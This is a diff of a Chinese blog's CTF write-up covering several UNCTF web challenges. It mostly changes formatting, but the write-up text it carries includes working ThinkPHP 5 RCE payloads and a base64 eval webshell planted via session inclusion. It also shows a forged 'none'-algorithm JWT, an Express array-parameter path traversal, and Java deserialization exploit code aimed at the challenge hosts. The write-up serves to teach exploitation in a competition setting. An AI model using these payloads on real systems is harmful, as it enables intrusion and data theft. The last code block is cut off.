@@ -52,7 +52,16 @@
 <meta property="og:image" content="https://i.loli.net/2019/11/13/xBCwvHUzo9rbiPa.png">
 <meta property="og:image" content="https://i.loli.net/2019/11/14/6jfEQOIYrNdeRJt.png">
 <meta property="og:image" content="https://i.loli.net/2019/11/14/wclOQby7Yio35fX.png">
-<meta property="og:updated_time" content="2019-11-14T01:38:39.553Z">
+<meta property="og:image" content="https://i.loli.net/2019/11/14/yjtBLMksbDmcqhn.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/14/eod7LV1FXTpZyRB.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/14/5YvimaCIJyQxe9u.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/14/erj2MzwIuLH8iSt.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/14/CknBzcRDuULNa2y.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/14/ZcquPY4BpD7CAVy.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/14/6S2GPcbBJkWQzDx.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/14/cTmhG39QuVYBJjs.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/14/Hdbw3OACRQMn6uZ.png">
+<meta property="og:updated_time" content="2019-11-14T07:50:24.177Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="unctf竞技赛-web">
 <meta name="twitter:image" content="https://i.loli.net/2019/10/24/5lg8q6MOGfAC9VN.png">
@@ -404,109 +413,108 @@
 </blockquote>
 <p>  *<em>tp的信息泄露，应该想到Tp存在日志，请求都会记录在日志中 *</em></p>
 <blockquote>
-<p>生成日志路径：/runtime/log/201805/01.log</p>
-<p>配置日志 ：/config/log.php</p>
+<p>生成日志路径：<code>/runtime/log/201805/01.log</code></p>
+<p>配置日志 ：<code>/config/log.php</code></p>
 </blockquote>
 <p>  写个脚本</p>
   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://183.129.189.60:10041/runtime/log/2019&quot;</span><br><span class="line">for i in range(13):</span><br><span class="line">    for j in range(32):</span><br><span class="line">        i = str(i).zfill(2)</span><br><span class="line">        j = str(j).zfill(2)</span><br><span class="line">        url1 = url + i + &apos;/&apos; + j + &apos;.log&apos;</span><br><span class="line">        print url1</span><br><span class="line">        r = requests.get(url1)</span><br><span class="line">        if r.status_code == 200:</span><br><span class="line">            with open(&apos;a.txt&apos;, &apos;w+&apos;) as f:</span><br><span class="line">                f.write(url1 + &quot;\n&quot;)</span><br><span class="line">            print &quot;ok &quot;+url1</span><br></pre></td></tr></table></figure>
 
-<p>  说明需要传入一个参数<code>safe_key</code></p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;safe_key&apos; =&gt; &apos;easy_pentesnt_is_s0fun&apos;,</span><br></pre></td></tr></table></figure>
+
+
+<p>说明需要传入一个参数<code>safe_key</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;safe_key&apos; =&gt; &apos;easy_pentesnt_is_s0fun&apos;,</span><br></pre></td></tr></table></figure>
 
 <p>  带上后访问，<code>public/index.php</code>，发现是<code>tp5</code>框架</p>
-<p>  RCE一把梭试试</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</span><br></pre></td></tr></table></figure>
+<p>RCE一把梭试试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</span><br></pre></td></tr></table></figure>
 
 <p>  发现出错了，换个命令</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=var_dump&amp;method=get&amp;get[]=aaa</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=var_dump&amp;method=get&amp;get[]=aaa</span><br></pre></td></tr></table></figure>
 
 <p>  <img src="https://i.loli.net/2019/11/13/exIClZAf2V18oWJ.png" alt="Snipaste_2019-11-13_08-51-52.png"></p>
-<p>  猜测应该是<code>system</code>被过滤了，那么考虑bp跑个字典</p>
-<p>  那么如何生成字典？参考之前fuzz php内置函数</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">	$arr = get_defined_functions()[&apos;internal&apos;];</span><br><span class="line">	var_dump($arr);</span><br><span class="line">	$file=fopen(&quot;welcome.txt&quot;,&quot;w&quot;);</span><br><span class="line">	foreach($arr as $t)&#123;</span><br><span class="line">		fwrite($file, $t.&quot;\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>猜测应该是<code>system</code>被过滤了，那么考虑bp跑个字典</p>
+<p>那么如何生成字典？参考之前fuzz php内置函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php </span><br><span class="line">$arr = get_defined_functions()[&apos;internal&apos;];</span><br><span class="line"> 	var_dump($arr);</span><br><span class="line"> 	$file=fopen(&quot;welcome.txt&quot;,&quot;w&quot;);</span><br><span class="line"> 	foreach($arr as $t)&#123;</span><br><span class="line"> 		fwrite($file, $t.&quot;\n&quot;);</span><br><span class="line"> 	&#125;</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>
 
 <p>  跑一下</p>
-<p>  <img src="https://i.loli.net/2019/11/13/Y2lcaQtBqhm9bOA.png" alt="Snipaste_2019-11-13_09-10-01.png"></p>
-<p>  <strong>思路一、</strong></p>
-<p>  先插个题外话</p>
+<p><img src="https://i.loli.net/2019/11/13/Y2lcaQtBqhm9bOA.png" alt="Snipaste_2019-11-13_09-10-01.png"></p>
+<p><strong>思路一、</strong></p>
+<p>先插个题外话</p>
 <blockquote>
 <p>另外php版本是<strong>7.1</strong>，也就是说assert不能动态调用了，而<strong>eval</strong>在php手册中已经写道：是一个<strong>language construct</strong>，而不是一个函数，所以也不能通过<strong>call_user_func</strong>来调用 </p>
 </blockquote>
-<p>  发现<code>scandir()</code>和 <code>show_source()</code>没被过滤，但是无法直接结合使用</p>
+<p>发现<code>scandir()</code>和 <code>show_source()</code>没被过滤，但是无法直接结合使用</p>
 <blockquote>
 <p>参考：<a href="https://xz.aliyun.com/t/6106#toc-4?tdsourcetag=s_pcqq_aiomsg" target="_blank" rel="noopener">https://xz.aliyun.com/t/6106#toc-4?tdsourcetag=s_pcqq_aiomsg</a> </p>
 </blockquote>
 <blockquote>
 <p>*<em><code>filter</code>其实是可以传递多个的，同时参数为参数引用。 *</em></p>
 </blockquote>
-<p>  这里我一开始的payload会出错。。。需要加上<code>server[]=1</code></p>
-<p>  <strong>有时间要再分析一下tp5的RCE</strong></p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=scandir&amp;server[]=1&amp;method=get&amp;get[]=/&amp;filter[]=var_dump</span><br></pre></td></tr></table></figure>
+<p>这里我一开始的payload会出错。。。需要加上<code>server[]=1</code></p>
+<p><strong>有时间要再分析一下tp5的RCE</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=scandir&amp;server[]=1&amp;method=get&amp;get[]=/&amp;filter[]=var_dump</span><br></pre></td></tr></table></figure>
 
 <p>  <img src="https://i.loli.net/2019/11/13/S8axCNTlkJgZP7W.png" alt="Snipaste_2019-11-13_10-03-50.png"></p>
-<p>  读取flag</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=show_source&amp;server[]=1&amp;method=get&amp;get[]=/home/flag_1sh3r3.txt</span><br></pre></td></tr></table></figure>
+<p>读取flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=show_source&amp;server[]=1&amp;method=get&amp;get[]=/home/flag_1sh3r3.txt</span><br></pre></td></tr></table></figure>
 
 
 
-<p>  <strong>思路二、</strong></p>
+<p><strong>思路二、</strong></p>
 <blockquote>
 <p>常见的tp5rce利用为 写日志，包含日志。写session，包含session。而这两种方式在这里都不可用，因为waf对&lt;?php等关键字进行了拦截。 </p>
 </blockquote>
 <blockquote>
 <p>所以我们这里通过变形来绕过，利用base64编码与php://filter伪协议，通过inlcude方法进行包含，可以利用</p>
 </blockquote>
-<p>  大致如下</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include(&apos;php://filter/read=convert.base64-decode/resource=/tmp/sess_kking&apos;);</span><br></pre></td></tr></table></figure>
+<p>大致如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include(&apos;php://filter/read=convert.base64-decode/resource=/tmp/sess_kking&apos;);</span><br></pre></td></tr></table></figure>
 
 <p>  设置session</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval(base64_decode($_GET[&apos;r&apos;]));;?&gt;</span><br><span class="line"></span><br><span class="line">=&gt;PD9waHAgQGV2YWwoYmFzZTY0X2RlY29kZSgkX0dFVFsnciddKSk7Oz8+</span><br><span class="line"></span><br><span class="line">=&gt;</span><br><span class="line">abPD9waHAgQGV2YWwoYmFzZTY0X2RlY29kZSgkX0dFVFsnciddKSk7Oz8%2b</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval(base64_decode($_GET[&apos;r&apos;]));;?&gt;</span><br><span class="line"></span><br><span class="line">=&gt;PD9waHAgQGV2YWwoYmFzZTY0X2RlY29kZSgkX0dFVFsnciddKSk7Oz8+</span><br><span class="line"></span><br><span class="line">=&gt;</span><br><span class="line">abPD9waHAgQGV2YWwoYmFzZTY0X2RlY29kZSgkX0dFVFsnciddKSk7Oz8%2b</span><br></pre></td></tr></table></figure>
 
 <blockquote>
 <p>开头的<code>ab</code>是为了让<code>shell payload</code> 的前后两串字符串满足base64解码的长度，使其能正常解码。 </p>
 </blockquote>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /public/index.php?s=captcha&amp;safe_key=easy_pentesnt_is_s0fun HTTP/1.1</span><br><span class="line"></span><br><span class="line">Cookie: PHPSESSID=ggg</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=think\Session::set&amp;method=get&amp;get[]=abPD9waHAgQGV2YWwoYmFzZTY0X2RlY29kZSgkX0dFVFsnciddKSk7Oz8%2bab&amp;server[]=1</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /public/index.php?s=captcha&amp;safe_key=easy_pentesnt_is_s0fun HTTP/1.1</span><br><span class="line"></span><br><span class="line">Cookie: PHPSESSID=ggg</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=think\Session::set&amp;method=get&amp;get[]=abPD9waHAgQGV2YWwoYmFzZTY0X2RlY29kZSgkX0dFVFsnciddKSk7Oz8%2bab&amp;server[]=1</span><br></pre></td></tr></table></figure>
 
 
 
-<p>  包含</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /public/index.php?s=captcha&amp;safe_key=easy_pentesnt_is_s0fun&amp;r=dmFyX2R1bXAoc2NhbmRpcigiL2hvbWUiKSk7 HTTP/1.1</span><br><span class="line"></span><br><span class="line">Cookie: PHPSESSID=ggg</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=strrev&amp;filter[]=think\__include_file&amp;method=get&amp;get[]=ggg_sses/pmet/emitnur/lmth/www/rav/=ecruoser/edoced-46esab.trevnoc=daer/retlif//:php&amp;server[]=1</span><br></pre></td></tr></table></figure>
+<p>包含</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /public/index.php?s=captcha&amp;safe_key=easy_pentesnt_is_s0fun&amp;r=dmFyX2R1bXAoc2NhbmRpcigiL2hvbWUiKSk7 HTTP/1.1</span><br><span class="line"></span><br><span class="line">Cookie: PHPSESSID=ggg</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=strrev&amp;filter[]=think\__include_file&amp;method=get&amp;get[]=ggg_sses/pmet/emitnur/lmth/www/rav/=ecruoser/edoced-46esab.trevnoc=daer/retlif//:php&amp;server[]=1</span><br></pre></td></tr></table></figure>
 
 <p>  <img src="https://i.loli.net/2019/11/13/nsRaNUhWkLH1mYJ.png" alt="Snipaste_2019-11-13_10-52-30.png"></p>
-<h3 id="NSB-Reset-Password"><a href="#NSB-Reset-Password" class="headerlink" title="NSB Reset Password"></a>NSB Reset Password</h3><p>  注册一个用户名登录，但是啥都没有。。</p>
-<p>  存在找回密码，那么应该是要通过这里得到admin密码，但是不知道管理员邮箱，抓包发现是应该是通过<code>PHPSESSID</code>作为用户凭证的，</p>
-<p>  那么只需要到第三步重置密码处时，再开一个窗口回到第一步（保持同一个<code>session</code>），将<code>username=admin</code>，发包，再回到第三步，此时<code>session</code>中的<code>username</code>信息已经变成了<code>admin</code>，重置密码后登录获得flag</p>
-<p>  <img src="https://i.loli.net/2019/11/13/bhxr6fA58ewaYPX.png" alt="Snipaste_2019-11-13_13-11-01.png"></p>
-<h3 id="Arbi"><a href="#Arbi" class="headerlink" title="Arbi"></a>Arbi</h3><p>  注册登录，发现<code>&lt;img src</code>处存在一个接口，<code>9000</code>端口，很有可能是python开启的一个服务，并且存在ssrf。</p>
-<p>  直接通过web目录也可以访问图像，说明开启服务的python文件就在web目录。</p>
-<p>  尝试<code>/</code>，发现不能列出目录</p>
-<p>  下面又是个知识盲区，自己对js后端开发了解的太少了😓</p>
+<h3 id="NSB-Reset-Password"><a href="#NSB-Reset-Password" class="headerlink" title="NSB Reset Password"></a>NSB Reset Password</h3><p>注册一个用户名登录，但是啥都没有。。</p>
+<p>存在找回密码，那么应该是要通过这里得到admin密码，但是不知道管理员邮箱，抓包发现是应该是通过<code>PHPSESSID</code>作为用户凭证的，</p>
+<p>那么只需要到第三步重置密码处时，再开一个窗口回到第一步（保持同一个<code>session</code>），将<code>username=admin</code>，发包，再回到第三步，此时<code>session</code>中的<code>username</code>信息已经变成了<code>admin</code>，重置密码后登录获得flag</p>
+<p><img src="https://i.loli.net/2019/11/13/bhxr6fA58ewaYPX.png" alt="Snipaste_2019-11-13_13-11-01.png"></p>
+<h3 id="Arbi"><a href="#Arbi" class="headerlink" title="Arbi"></a>Arbi</h3><p>注册登录，发现<code>&lt;img src</code>处存在一个接口，<code>9000</code>端口，很有可能是python开启的一个服务，并且存在ssrf。</p>
+<p>直接通过web目录也可以访问图像，说明开启服务的python文件就在web目录。</p>
+<p>尝试<code>/</code>，发现不能列出目录</p>
+<p>下面又是个知识盲区，自己对js后端开发了解的太少了😓</p>
 <blockquote>
 <p>X-Powered-By: <code>Express</code>看出后端采用<code>express</code>开发，web应用下应存在<code>package.json</code>文件 </p>
 </blockquote>
-<p>  ssrf的限制是用户名需要和url匹配，注册 <code>../package.json?</code> 用户，利用<code>?</code>绕过<code>.jpg</code>后缀</p>
-<p>  通过接口读取到了<code>package.json</code>文件</p>
-<p>  <img src="https://i.loli.net/2019/11/13/MI2e9pTZaJqVjxu.png" alt="Snipaste_2019-11-13_20-59-46.png"></p>
-<p>  继续读取<code>mainapp.js</code></p>
-<p>  继续读取<code>/routers/index.js</code></p>
-<p>  提示源码在<code>/VerYs3cretWwWb4ck4p33441122.zip</code>中，</p>
-<p>  下载之后白盒审计，<code>js后端</code>这块真的有时间需要好好学一下</p>
-<p>  下面摘自wp，写的我能看懂👍</p>
+<p>ssrf的限制是用户名需要和url匹配，注册 <code>../package.json?</code> 用户，利用<code>?</code>绕过<code>.jpg</code>后缀</p>
+<p>通过接口读取到了<code>package.json</code>文件</p>
+<p><img src="https://i.loli.net/2019/11/13/MI2e9pTZaJqVjxu.png" alt="Snipaste_2019-11-13_20-59-46.png"></p>
+<p>继续读取<code>mainapp.js</code></p>
+<p>继续读取<code>/routers/index.js</code></p>
+<p>提示源码在<code>/VerYs3cretWwWb4ck4p33441122.zip</code>中，</p>
+<p>下载之后白盒审计，<code>js后端</code>这块真的有时间需要好好学一下</p>
+<p>下面摘自wp，写的我能看懂👍</p>
 <blockquote>
 <p>然后就是白盒审计，可以发现注册登录功能采用了jwt认证，这里我参考了<a href="https://github.com/justcatthefish/ctf/tree/master/2019-04-25-Angstrom2019/web#ångstromctf-2019----quick-write-ups-by-terjanq-web" target="_blank" rel="noopener">ångstromCTF 2019</a>的 Cookie Cutter题目 认证过程是，每个人拥有自己独立的jwt secret 并且存在于服务端一个列表中，并且不同用户secret列表对应的id存储在了jwt中，登陆的时候会直接从jwt token中读取id 然后通过列表获取secret 进行解密，这里有个trick，node的jsonwebtoken 有个bug，当jwt secret为空时 jsonwebtoken会采用algorithm none进行解密 又因为服务端 通过 </p>
 </blockquote>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var secret = global.secretlist[id];</span><br><span class="line">jwt.verify(req.cookies.token,secret);</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var secret = global.secretlist[id];</span><br><span class="line">jwt.verify(req.cookies.token,secret);</span><br></pre></td></tr></table></figure>
 
 <blockquote>
 <p>解密，我可以通过传入不存在的id，让secret为undefined,导致algorithm为none,然后就可以通过伪造jwt来成为admin</p>
 </blockquote>
   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># pip3 install pyjwt</span><br><span class="line">import jwt</span><br><span class="line">token = jwt.encode(&#123;&quot;id&quot;:-1,&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;123456&quot;&#125;,algorithm=&quot;none&quot;,key=&quot;&quot;).decode(encoding=&apos;utf-8&apos;)</span><br><span class="line">print(token)</span><br></pre></td></tr></table></figure>
 
-
 <p>  得到</p>
   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjM0NTYiLCJpZCI6LTF9.</span><br></pre></td></tr></table></figure>
-
 
 <p>  <img src="https://i.loli.net/2019/11/13/jp1FPOINHnih8tU.png" alt="Snipaste_2019-11-13_21-59-17.png"></p>
 <p>  访问<code>/login</code>，输入<code>jwt</code>解析后对应的<code>admin</code>，<code>123456</code>，并修改token</p>
@@ -516,19 +524,16 @@
 </blockquote>
   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!/^key$/im.test(req.query.name.filename))return res.sendStatus(500);</span><br></pre></td></tr></table></figure>
 
-
 <blockquote>
 <p>的白名单过滤 第二个过滤是 判断filename 不能大于3,否者会过滤.和/,而读取flag需要先目录穿越到根目录 而../就已经占了3个字符，再加上flag肯定超过限制 这时候可以换个思路，length不仅可以取字符串长度还可以取数组长度，把filename设数组，再配合下面的循环 即可完美绕过过滤 而<code>express</code> 中当碰到两个同名变量时，会把这个变量设置为<code>数组</code>，例如a=123&amp;a=456 解析后 a = [123,456]，所以最终组合成 </p>
 </blockquote>
   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name[filename]=../&amp;name[filename]=f&amp;name[filename]=l&amp;name[filename]=a&amp;name[filename]=g</span><br></pre></td></tr></table></figure>
-
 
 <p>  <img src="https://i.loli.net/2019/11/13/uSKOtwHr9WTAUCi.png" alt="Snipaste_2019-11-13_22-03-43.png"></p>
 <h3 id="GoodJava"><a href="#GoodJava" class="headerlink" title="GoodJava"></a>GoodJava</h3><p>  提供了一个Jar包，用idea打开反编译（还得现场学一下）</p>
 <p>  <strong>其实挺尴尬的，自己专业其实接触java比较多，现在看到java反而感觉比php还陌生😅</strong></p>
 <p>  <img src="https://i.loli.net/2019/11/13/6lqefogkBI5znZR.png" alt="Snipaste_2019-11-13_22-15-25.png"></p>
   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp &quot;C:\Users\gqy\IntelliJ IDEA\plugins\java-decompiler\lib\java-decompiler.jar&quot; org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=true GoodJava.jar mysrc</span><br></pre></td></tr></table></figure>
-
 
 <p>  将得到的<code>GoodJava.jar</code>解压</p>
 <p>  <img src="https://i.loli.net/2019/11/13/VUZS4tKBsurNw5h.png" alt="Snipaste_2019-11-13_22-22-11.png"></p>
@@ -552,10 +557,8 @@
 <p>  wp的脚本</p>
   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">package com.unctf.pojo;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.httpclient.HttpClient;</span><br><span class="line">import org.apache.commons.httpclient.methods.ByteArrayRequestEntity;</span><br><span class="line">import org.apache.commons.httpclient.methods.PostMethod;</span><br><span class="line">import org.apache.commons.httpclient.params.HttpMethodParams;</span><br><span class="line">import org.apache.tomcat.util.codec.binary.Base64;</span><br><span class="line">import com.unctf.pojo.Man;</span><br><span class="line"></span><br><span class="line">public class Exp&#123;</span><br><span class="line">    public static void main(String[] args) throws IOException &#123;</span><br><span class="line">        String url = &quot;http://183.129.189.60:10045/server&quot;;</span><br><span class="line">        Man person = new Man(&quot;asd&quot;);</span><br><span class="line">        HttpClient httpClient = new HttpClient();</span><br><span class="line">        httpClient.getHttpConnectionManager().getParams().setConnectionTimeout(15000);</span><br><span class="line">        PostMethod postMethod = new PostMethod(url);</span><br><span class="line">        postMethod.getParams().setParameter(HttpMethodParams.SO_TIMEOUT, 60000);</span><br><span class="line">        postMethod.setRequestHeader(&quot;Content-Type&quot;, &quot;application/raw&quot;);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream out = new ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">        out.writeObject(person);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        ByteArrayRequestEntity byteArrayRequestEntity = new ByteArrayRequestEntity(new Base64().encode(byteArrayOutputStream.toByteArray()));</span><br><span class="line">        System.out.println(byteArrayOutputStream.toByteArray());</span><br><span class="line">        postMethod.setRequestEntity(byteArrayRequestEntity);</span><br><span class="line"></span><br><span class="line">        httpClient.executeMethod(postMethod);</span><br><span class="line">        String responseBodyAsString = postMethod.getResponseBodyAsString();</span><br><span class="line">        postMethod.releaseConnection();</span><br><span class="line">        System.out.println(&quot;---------------------------&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        System.out.println(responseBodyAsString);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-
 <p>  成功</p>
 <p>  <img src="https://i.loli.net/2019/11/14/6jfEQOIYrNdeRJt.png" alt="Snipaste_2019-11-14_09-05-33.png"></p>
-<p>  自己也分析</p>
 <blockquote>
 <p>然后就是第二步，考点是代码执行绕过</p>
 <p>这里有个<code>SPEL</code>注入，可以构造任意类，但是同样代码过滤了<code>Runtime|ProcessBuilder|Process</code></p>
@@ -567,11 +570,69 @@
 </blockquote>
   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">package com.unctf.pojo;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.httpclient.HttpClient;</span><br><span class="line">import org.apache.commons.httpclient.methods.ByteArrayRequestEntity;</span><br><span class="line">import org.apache.commons.httpclient.methods.PostMethod;</span><br><span class="line">import org.apache.commons.httpclient.params.HttpMethodParams;</span><br><span class="line">import org.apache.tomcat.util.codec.binary.Base64;</span><br><span class="line">import com.unctf.pojo.Man;</span><br><span class="line"></span><br><span class="line">public class Exp&#123;</span><br><span class="line">    public static void main(String[] args) throws IOException &#123;</span><br><span class="line">    	</span><br><span class="line">    	String url = &quot;http://183.129.189.60:10045/admin&quot;;</span><br><span class="line">    	HttpClient httpClient = new HttpClient();</span><br><span class="line">        httpClient.getHttpConnectionManager().getParams().setConnectionTimeout(15000);</span><br><span class="line">        PostMethod postMethod = new PostMethod(url);</span><br><span class="line">        postMethod.getParams().setParameter(HttpMethodParams.SO_TIMEOUT, 60000);</span><br><span class="line">        postMethod.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">        postMethod.setParameter(&quot;secret&quot;,&quot;k8Xnld8zOR2FhXEEnv3j3LQAiYGcb5IaPdVj&quot;);</span><br><span class="line"></span><br><span class="line">        String 